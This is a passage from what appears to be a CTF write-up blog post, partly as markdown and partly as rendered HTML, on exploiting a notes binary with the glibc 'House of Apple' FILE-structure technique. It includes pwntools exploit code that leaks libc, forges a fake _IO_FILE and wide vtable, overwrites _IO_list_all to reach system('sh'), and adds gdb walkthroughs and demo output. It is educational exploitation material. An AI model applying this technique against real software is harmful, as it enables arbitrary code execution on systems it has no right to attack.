0x68: libc.sym['system']\r\n}, length=0x80)\r\n```\r\n\r\n\r\n\r\n* The `doallocate` function pointer is overwritten with `system`.\r\n* glibc does **not validate** this wide vtable.\r\n* When glibc calls `doallocate`, it actually calls:\r\n\r\n  ```\r\n  system(fake_file->_flags)\r\n  ```\r\n\r\nAnd since `_flags = \"  sh\"`, we get a shell.\r\n\r\n---\r\n\r\n## How everything is laid out in memory\r\n\r\n```\r\nOffset 0x000: fake _IO_FILE      (224 bytes)\r\nOffset 0x100: fake _IO_wide_data (256 bytes)\r\nOffset 0x200: fake wide_vtable   (128 bytes)\r\n```\r\n\r\nAnd then we write it into the heap:\r\n\r\n```python\r\npayload = fake_file.ljust(0x100, b'\\x00')\r\npayload += wide_data.ljust(0x200 - 0x100, b'\\x00')\r\npayload += wide_vtable\r\n\r\ncreate(20000, payload)\r\n```\r\n\r\nThis puts **all fake structures next to each other**, so pointers inside them can reference each other safely.\r\n\r\n\r\n#### Leaking the heap address\r\n\r\n```python\r\nheap_addr = u64(read_note(0).ljust(8, b'\\x00'))\r\n```\r\n\r\nAt this point, we already created a note that lives on the heap. When we read that note back, the program does not just give us our clean payload. It also leaks **heap metadata** that glibc stores next to heap chunks. This metadata contains pointers that point back into the heap itself.\r\n\r\nBy reading the first few bytes of the note and converting them into a 64-bit value, we recover a **real heap address**. \r\n\r\n\r\n\r\n####  Patching the fake FILE pointers\r\n\r\nNow that we know the heap base address, we can **fix up the fake FILE structure** so all its internal pointers point to valid memory.\r\n\r\n```python\r\nwrite_note(0, 0x88, p64(heap_addr + 0x10))   # _lock\r\n```\r\n\r\nThe `_lock` field must point to writable memory or glibc will crash when it tries to lock the FILE. We point it slightly inside the heap, which is always writable.\r\n\r\n```python\r\nwrite_note(0, 0xa0, p64(heap_addr + 0x100))  # _wide_data\r\n```\r\n\r\nThis tells glibc where the wide-character data lives. We already placed our fake `_IO_wide_data` structure at offset `0x100` inside the payload, so we point `_wide_data` there.\r\n\r\n```python\r\nwrite_note(0, 0x1e0, p64(heap_addr + 0x200)) # _wide_vtable\r\n```\r\n\r\nFinally, we patch the `_wide_vtable` pointer to point to our fake wide vtable, which we placed at offset `0x200`. This is the most important pointer, because glibc does **not validate** it. When glibc later calls a wide-character function, it will jump to whatever function pointer we placed there.\r\n\r\n![Fake FILE Structure](/images/posts/an-apple-a-day/apple-9.png)\r\n\r\n\r\n\r\n\r\n#### Hijacking `_IO_list_all` \r\n\r\nThis is the most important step of the whole exploit. Until now, we’ve only *prepared* our fake FILE structure. Now we force glibc to actually **use it**.\r\n\r\nglibc keeps a global pointer called `_IO_list_all`. This pointer is the **head of a linked list of all FILE structures** that exist in the program. When the program exits, glibc walks this list and flushes every file it finds.\r\n\r\nNormally, `_IO_list_all` points to real FILE objects inside libc.\r\n\r\n\r\n\r\n\r\n\r\n```python\r\nio_list_all = libc.sym['_IO_list_all']\r\noffset = io_list_all - heap_addr\r\nwrite_note(0, offset, p64(heap_addr))\r\n```\r\n\r\n\r\n\r\n\r\n```python\r\nio_list_all = libc.sym['_IO_list_all']\r\n```\r\n\r\nNow that we know the libc base address, we can compute the **exact address** of `_IO_list_all` in memory.\r\n\r\n```python\r\noffset = io_list_all - heap_addr\r\n```\r\n\r\nOur arbitrary write primitive is relative to the start of our heap note.\r\nSo we calculate how far `_IO_list_all` is **from our heap buffer**.\r\n\r\nThis converts an absolute address into a relative offset we can write to.\r\n\r\n```python\r\nwrite_note(0, offset, p64(heap_addr))\r\n```\r\n\r\nThis is the takeover.\r\n\r\nWe overwrite the value of `_IO_list_all` so that instead of pointing to real FILE objects, it now points directly to **our fake FILE structure on the heap**.\r\n\r\n\r\n\r\nglibc does **not** check whether `_IO_list_all` points to a real FILE.\r\nIt blindly trusts the pointer.\r\n\r\nSo after this write:\r\n\r\n* glibc believes our fake FILE is a real one\r\n* it adds it to the cleanup process\r\n* when `exit()` is called, glibc will process *our* FILE\r\n\r\n\r\n\r\n**Before**\r\n\r\n```\r\n_IO_list_all → real FILE → real FILE → ...\r\n```\r\n\r\n**After**\r\n\r\n```\r\n_IO_list_all → fake FILE (heap) → fake wide_data → fake vtable → system()\r\n```\r\n\r\n### final exploit\r\n\r\n\r\n```python\r\nfrom pwn import *\r\n\r\nelf = ELF('./notes_patched')\r\nlibc = ELF('./libc.so.6')\r\np = process('./notes_patched')\r\n```\r\n\r\n**What this does:**\r\n- `ELF()` loads binary information (addresses, symbols, etc.)\r\n- `process()` starts the target program\r\n- `pwn` library handles communication and address packing\r\n\r\n### Helper Functions\r\n\r\n```python\r\ndef create(size, content):\r\n    p.sendlineafter(b'>> ', b'1')           # Select create option\r\n    p.sendlineafter(b'SIZE: ', str(size).encode())\r\n    p.sendlineafter(b'CHARS): ', content)   # Send note content\r\n```\r\n\r\nThis function automates creating a note by:\r\n1. Waiting for the menu prompt `>> `\r\n2. Sending option `1` (create)\r\n3. Sending the size\r\n4. Sending the content\r\n\r\n\r\n```python\r\ndef read_note(idx):\r\n    p.sendlineafter(b'>> ', b'3')\r\n    p.sendlineafter(b'INDEX: ', str(idx).encode())\r\n    p.recvuntil(b'NOTE: ')\r\n    data = p.recvuntil(b'\u003C BACK', drop=True)\r\n    return data\r\n```\r\n\r\nReads a note and returns its content. `drop=True` removes the `\u003C BACK` delimiter.\r\n\r\n```python\r\ndef write_note(idx, offset, content):\r\n    p.sendlineafter(b'>> ', b'4')\r\n    p.sendlineafter(b'INDEX: ', str(idx).encode())\r\n    p.sendlineafter(b'INDEX: ', str(offset).encode())\r\n    p.sendlineafter(b'DATA: ', content)\r\n```\r\n\r\nWrites to a note at a specific offset (the vulnerability!).\r\n\r\n### Exploitation\r\n\r\n```python\r\n# Leak libc\r\nlibc_leak = u64(read_note(-16).ljust(8, b'\\x00'))\r\nlibc.address = libc_leak - libc.sym['free']\r\n```\r\n\r\n- `u64()` unpacks 8 bytes to a 64-bit integer\r\n- `ljust(8, b'\\x00')` pads data to 8 bytes\r\n- Subtracting `free` offset gives us libc base\r\n\r\n```python\r\n# Build fake FILE\r\nfake_file = flat({\r\n    0x00: b\"  sh\\x00\\x00\\x00\\x00\",\r\n    0x88: 0,\r\n    0xa0: 0,\r\n    0xc0: 1,\r\n    0xd8: libc.sym['_IO_wfile_jumps']\r\n}, length=224, filler=b'\\x00')\r\n```\r\n\r\n`flat()` creates binary data with values at specific offsets, padding with null bytes.\r\n\r\n```python\r\n# Patch pointers\r\nwrite_note(0, 0x88, p64(heap_addr + 0x10))\r\n```\r\n\r\n- `p64()` packs a 64-bit integer to 8 bytes (little-endian)\r\n- Overwrites the `_lock` field at offset 0x88\r\n\r\n```python\r\n# Hijack _IO_list_all\r\noffset = io_list_all - heap_addr\r\nwrite_note(0, offset, p64(heap_addr))\r\n```\r\n\r\nUses the arbitrary relative write to overwrite `_IO_list_all` in libc!\r\n\r\n---\r\n\r\n## Why This Works\r\n\r\n### The glibc Call Chain\r\n\r\nWhen you exit, glibc does this:\r\n\r\n```c\r\n// In elf/dl-fini.c\r\nexit() {\r\n    ...\r\n    _IO_cleanup();\r\n}\r\n\r\n// In libio/genops.c\r\n_IO_cleanup() {\r\n    return _IO_flush_all_lockp(0);\r\n}\r\n\r\n// In libio/genops.c\r\n_IO_flush_all_lockp() {\r\n    struct _IO_FILE *fp;\r\n\r\n    // Iterate the chain!\r\n    for (fp = _IO_list_all; fp != NULL; fp = fp->_chain) {\r\n\r\n        // Check if buffer needs flushing\r\n        if (fp->_IO_write_ptr > fp->_IO_write_base) {\r\n\r\n            // Call overflow from vtable\r\n            if (fp->_mode \u003C= 0) {\r\n                // Normal mode\r\n                _IO_overflow(fp, EOF);\r\n            } else {\r\n                // Wide mode (our case!)\r\n                _IO_wfile_overflow(fp, WEOF);\r\n            }\r\n        }\r\n    }\r\n\r\n}\r\n// In libio/wfileops.c\r\n_IO_wfile_overflow() {\r\n    ...\r\n    // Check vtable (VALIDATED ✓)\r\n    _IO_vtable_check(fp->vtable);  // Passes! We use _IO_wfile_jumps\r\n\r\n    // Eventually calls:\r\n    fp->_wide_data->_wide_vtable->doallocate(fp);\r\n    // ↑ NOT VALIDATED ✗\r\n}\r\n```\r\n\r\n### The Bypass\r\n\r\n**glibc's protection:**\r\n```c\r\nvoid _IO_vtable_check(struct _IO_jump_t *vtable) {\r\n    // Check if vtable is in valid range\r\n    if (vtable \u003C &__start__IO_vtables ||\r\n        vtable >= &__stop__IO_vtables) {\r\n        abort();  // Kill the program!\r\n    }\r\n}\r\n```\r\n\r\n\r\n1. We use `_IO_wfile_jumps` (a real vtable) \r\n2. But `_wide_vtable` is NOT checked \r\n3. When `doallocate` is called from `_wide_vtable`, it executes our function\r\n\r\n\r\n![Exploit Diagram](/images/posts/an-apple-a-day/apple-10.png)\r\n\r\n\r\n## More on house of apple how it works \r\n\r\n\r\n\r\n```c\r\nstatic wint_t _IO_wstrn_overflow (FILE *fp, wint_t c)\r\n{\r\n    _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;\r\n\r\n    // Key Check: if this passes, we write to memory!\r\n    if (fp->_wide_data->_IO_buf_base != snf->overflow_buf)\r\n    {\r\n        // VULNERABILITY: Writes heap address to controlled location!\r\n        // overflow_buf is at fp + 0xf0\r\n\r\n        fp->_wide_data->_IO_write_base = snf->overflow_buf;   // [_wide_data+0x18\r\n]\r\n        fp->_wide_data->_IO_read_base = snf->overflow_buf;    // [_wide_data+0x10\r\n]\r\n        fp->_wide_data->_IO_read_ptr = snf->overflow_buf;     // [_wide_data+0x00\r\n]\r\n        fp->_wide_data->_IO_read_end = snf->overflow_buf + N; // [_wide_data+0x08\r\n]\r\n    }\r\n\r\n    // Additional writes\r\n    fp->_wide_data->_IO_write_ptr = snf->overflow_buf;  // [_wide_data+0x20]\r\n    fp->_wide_data->_IO_write_end = snf->overflow_buf;  // [_wide_data+0x28]\r\n\r\n    return c;\r\n}\r\n```\r\n\r\n**IMPACT:** By controlling `fp->_wide_data`, we control WHERE these heap addresses are written!\r\n\r\n\r\n### Demo Program Output\r\n\r\n```\r\n[*] allocate a 0x100 chunk\r\n===========================old value=======================\r\n[0x2a410310]: 0x1122334455667788  0x1122334455667788\r\n[0x2a410320]: 0x1122334455667788  0x1122334455667788\r\n[0x2a410330]: 0x1122334455667788  0x1122334455667788\r\n[0x2a410340]: 0x1122334455667788  0x1122334455667788\r\n===========================old value=======================\r\n\r\n[*] puts address: 0x7fd0ca691cc0\r\n[*] stderr->_IO_write_ptr address: 0x7fd0ca82b478\r\n[*] stderr->_flags2 address: 0x7fd0ca82b4c4\r\n[*] stderr->_wide_data address: 0x7fd0ca82b4f0\r\n[*] stderr->vtable address: 0x7fd0ca82b528\r\n[*] _IO_wstrn_jumps address: 0x7fd0ca826b90\r\n\r\n[+] step 1: change stderr->_IO_write_ptr to -1\r\n[+] step 2: change stderr->_flags2 to 8\r\n[+] step 3: replace stderr->_wide_data with the allocated chunk\r\n[+] step 4: replace stderr->vtable with _IO_wstrn_jumps\r\n[+] step 5: call fcloseall and trigger house of apple\r\n\r\n===========================new value=======================\r\n[0x2a410310]: 0x00007fd0ca82b770  0x00007fd0ca82b870\r\n[0x2a410320]: 0x00007fd0ca82b770  0x00007fd0ca82b770\r\n[0x2a410330]: 0x00007fd0ca82b770  0x00007fd0ca82b770\r\n[0x2a410340]: 0x00007fd0ca82b770  0x00007fd0ca82b870\r\n===========================new value=======================\r\n```\r\n\r\n\r\n\r\n| Phase | Memory Address | Value | Explanation |\r\n|-------|----------------|-------|-------------|\r\n| **BEFORE** | `0x2a410310` | `0x1122334455667788` | Controlled fill value we set initially |\r\n| **AFTER** | `0x2a410310` | `0x00007fd0ca82b770` | `stderr->overflow_buf` address leaked! |\r\n\r\n**This demonstrates:** We can write a known address (overflow_buf = heap/libc addr) to ANY memory location we control via `_wide_data` :)\r\n\r\n\r\n#### Step 1: Set Breakpoint Before fcloseall()\r\n\r\n```gdb\r\ngdb ./house_of_apple\r\nbreak fcloseall\r\nrun\r\n```\r\n\r\n#### Step 2: Examine Hijacked stderr Structure\r\n\r\n```gdb\r\n# Check stderr location\r\np stderr\r\n# $1 = (struct _IO_FILE *) 0x7ffff7e2b4a0 \u003C_IO_2_1_stderr_>\r\n\r\n# Examine critical members\r\nx/gx (stderr + 0x28)  # _IO_write_ptr (should be -1)\r\nx/gx (stderr + 0x74)  # _flags2 (should be 8)\r\nx/gx (stderr + 0xa0)  # _wide_data (should point to our chunk)\r\nx/gx (stderr + 0xd8)  # vtable (should be _IO_wstrn_jumps)\r\n```\r\n\r\n**Expected Output:**\r\n```\r\n_IO_write_ptr:  0xffffffffffffffff  (-1)\r\n_flags2:        0x0000000000000008  (wide mode enabled)\r\n_wide_data:     0x0000000000405310  (our controlled chunk!)\r\nvtable:         0x00007ffff7e26b90  (_IO_wstrn_jumps)\r\n```\r\n\r\n#### Step 3: Examine Target Chunk BEFORE Attack\r\n\r\n```gdb\r\n# Our chunk that _wide_data points to\r\nx/16gx 0x405310\r\n```\r\n\r\n**Output:**\r\n```\r\n0x405310: 0x1122334455667788  0x1122334455667788\r\n0x405320: 0x1122334455667788  0x1122334455667788\r\n0x405330: 0x1122334455667788  0x1122334455667788\r\n0x405340: 0x1122334455667788  0x1122334455667788\r\n```\r\n\r\n#### Step 4: Continue and Break After _IO_wstrn_overflow\r\n\r\n```gdb\r\nbreak _IO_wstrn_overflow\r\ncontinue\r\n\r\n# Inside _IO_wstrn_overflow, examine:\r\nprint/x $rdi              # fp (our fake _IO_FILE)\r\nprint/x $rdi + 0xf0       # overflow_buf address\r\nx/gx $rdi + 0xa0          # fp->_wide_data (our target chunk)\r\n```\r\n\r\n#### Step 5: Examine Target Chunk AFTER Attack\r\n\r\n```gdb\r\nfinish  # Return from _IO_wstrn_overflow\r\nx/16gx 0x405310  # Check our chunk again\r\n```\r\n\r\n**Output:**\r\n```\r\n0x405310: 0x00007ffff7e2b770  0x00007ffff7e2b870  ← CHANGED!\r\n0x405320: 0x00007ffff7e2b770  0x00007ffff7e2b770  ← CHANGED!\r\n0x405330: 0x00007ffff7e2b770  0x00007ffff7e2b770  ← CHANGED!\r\n0x405340: 0x00007ffff7e2b770  0x00007ffff7e2b870  ← CHANGED!\r\n```\r\n\r\n### SUM FACTZ\r\n\r\n1. **Before:** Chunk filled with `0x1122334455667788`\r\n2. **After:** Chunk filled with `0x00007ffff7e2b770` (overflow_buf address)","src/content/blog/an-apple-a-day.md","f160eb60cf8836fd",{"html":223,"metadata":224},"\u003Cp>\u003Cem>[Abusing glibc Wide-Mode I/O and FILE Structure Corruption for Reliable Code Execution]\u003C/em>\u003C/p>\n\u003Chr>\n\u003Cp>We are provided with the following \u003Ccode>checksec\u003C/code> output for the binary \u003Ccode>notes_patched\u003C/code>:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">muffin@gentoo\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> checksec\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -f\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> notes_patched\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">ELF64:\u003C/span>\u003Cspan style=\"color:#F97583\"> |\u003C/span>\u003Cspan style=\"color:#B392F0\"> Canary:\u003C/span>\u003Cspan style=\"color:#79B8FF\"> true\u003C/span>\u003Cspan style=\"color:#9ECBFF\">  CFI:\u003C/span>\u003Cspan style=\"color:#79B8FF\"> false\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> SafeStack:\u003C/span>\u003Cspan style=\"color:#79B8FF\"> false\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Fortify:\u003C/span>\u003Cspan style=\"color:#79B8FF\"> false\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Fortified:\u003C/span>\u003Cspan style=\"color:#79B8FF\">  0\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> NX:\u003C/span>\u003Cspan style=\"color:#79B8FF\"> true\u003C/span>\u003Cspan style=\"color:#9ECBFF\">  PIE:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Full\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Relro:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Full\u003C/span>\u003Cspan style=\"color:#9ECBFF\">    RPATH:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> None\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> RUNPATH:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> .\u003C/span>\u003Cspan style=\"color:#F97583\"> |\u003C/span>\u003Cspan style=\"color:#B392F0\"> File:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> notes_patched\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch3 id=\"enabled-protections\">Enabled Protections\u003C/h3>\n\u003Cul>\n\u003Cli>\n\u003Cp>\u003Cstrong>Stack Canary: Enabled\u003C/strong>\r\nStack canaries are present, making straightforward stack-based buffer overflows harder to exploit without a leak.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>NX (Non-Executable Memory): Enabled\u003C/strong>\r\nThe stack and heap are non-executable, preventing direct shellcode execution in writable memory regions.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>PIE (Position Independent Executable): Enabled (Full)\u003C/strong>\r\nThe binary is fully position-independent, meaning ASLR randomizes its base address at runtime.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>RELRO: Enabled (Full)\u003C/strong>\r\nThe Global Offset Table (GOT) is marked read-only after relocation, preventing GOT overwrite attacks.\u003C/p>\n\u003C/li>\n\u003C/ul>\n\u003Ch3 id=\"disabled-protections\">Disabled Protections\u003C/h3>\n\u003Cul>\n\u003Cli>\n\u003Cp>\u003Cstrong>CFI (Control Flow Integrity): Disabled\u003C/strong>\r\nNo enforcement of valid control-flow transfers, allowing indirect jumps or returns to be abused if control is gained.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>SafeStack: Disabled\u003C/strong>\r\nNo separation between safe and unsafe stack objects, increasing the impact of memory corruption bugs.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>FORTIFY_SOURCE: Disabled\u003C/strong>\r\nNo fortified libc wrappers are in use (and no functions are fortified), reducing runtime bounds checking.\u003C/p>\n\u003C/li>\n\u003C/ul>\n\u003Cp>RUNPATH: . - The binary looks for shared libraries in the current directory first (potential security risk)\u003C/p>\n\u003Cp>file\r\n\u003Cimg src=\"/images/posts/an-apple-a-day/apple-1.png\" alt=\"Binary File Info\">\r\nstrings so this is a notes app ,\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/an-apple-a-day/apple-2.png\" alt=\"Strings Output\">\u003C/p>\n\u003Cp>The decompilation for the binary was more helpful as i got the whole understanding of the program ;\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">//\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// This file was generated by the Retargetable Decompiler\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Website: https://retdec.com\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">//\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">#include\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> &#x3C;stdint.h>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">#include\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> &#x3C;stdio.h>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">#include\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> &#x3C;stdlib.h>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">#include\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> &#x3C;string.h>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// ------------------------ Structures ------------------------\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> _IO_FILE {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int32_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> e0;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">};\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// ------------------- Function Prototypes --------------------\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> _fini\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> _init\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> _start\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> a1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> a2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> a3\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> a4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> a5\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> a6\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> create_note\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> delete_note\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_1030\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\"> ptr\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_1040\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\"> s\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_1050\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_1060\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\"> format\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, ...);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_1070\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\"> s\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\"> reject\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_1080\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\"> s\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> n\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> _IO_FILE \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\"> stream\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_1090\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_10a0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> size\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_10b0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> _IO_FILE \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\"> stream\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\"> buf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> modes\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> n\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> function_10c0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\"> 